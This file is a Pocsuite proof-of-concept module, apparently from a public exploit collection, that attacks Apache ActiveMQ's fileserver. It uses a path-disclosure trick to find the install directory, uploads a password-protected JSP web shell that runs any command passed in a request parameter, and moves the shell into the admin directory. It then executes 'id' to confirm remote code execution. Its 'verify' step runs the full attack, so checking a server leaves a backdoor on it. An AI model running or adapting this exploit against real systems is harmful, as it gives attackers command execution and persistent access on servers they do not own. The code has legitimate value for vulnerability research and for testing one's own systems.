#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class ActiveMQPOC(POCBase):
    vulID = '32'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-06-05' #漏洞公开的时间,不知道就写今天

    author = 'arr0w1' #  PoC作者的大名
    createDate = '2018-06-05'# 编写 PoC 的日期
    updateDate = '2018-06-05'# PoC 更新的时间,默认和编写时间一样
    references = 'https://help.aliyun.com/knowledge_detail/50436.html'# 漏洞地址来源,0day不用写
    name = 'ActiveMQ Unauthorized access'# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = 'ActiveMQ'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Command Execution'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        ActiveMQ 未授权访问漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 32-ActiveMQ-unauthorized-access.py -u 127.0.0.1 --verify
    def _verify(self):
        #定义返回结果
        return self._attack()

    #漏洞攻击
    def _attack(self):
         #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
        #如果设置端口则取端口,没有设置则为默认端口
        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = '8161'


       
        #检测漏洞
        url = 'http://%s:%s'%(_host,_port)
        # print url
        try:
            get_fileserver_path_url = url + '/fileserver/%08/..%08/.%08/%08'
            res = req.put(url=get_fileserver_path_url, timeout=5, allow_redirects=False)
            # print res.reason
            path = re.findall(r'/.*?(?=fileserver/.*)', res.reason)[0]
            # print path
            put_jsp_url = url + '/fileserver/haha.jsp'
            jsp_data = '''
                        <%
                if("sec".equals(request.getParameter("pwd"))){
                    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
                    int a = -1;
                    byte[] b = new byte[2048];
                    out.print("<pre>");
                    while((a=in.read(b))!=-1){
                        out.println(new String(b));
                    }
                    out.print("</pre>");
                }
            %>
            '''
            res = req.put(url=put_jsp_url, timeout=5, allow_redirects=False, data = jsp_data)
            if res.status_code == 204:
                # print 'ok'
                headers = {
                    'Destination': 'file://'+path+'admin/haha.jsp'
                }
                res = req.request('move', url=put_jsp_url, timeout=5, allow_redirects=False, headers=headers)
                if res.status_code == 204:
                    # print 'ok'
                    exploit_url = url + '/admin/haha.jsp?pwd=sec&i=id'
                    res = req.get(url=exploit_url, timeout=5, allow_redirects=False)
                    if 'uid' in res.text:
                        id_info = re.findall(r'(?<=<pre>).*', res.text)[0]
                        print id_info
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = self.url
                        result['VerifyInfo']['Payload'] = exploit_url
                    
        except Exception as e:
            print e
        return self.save_output(result)

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(ActiveMQPOC)
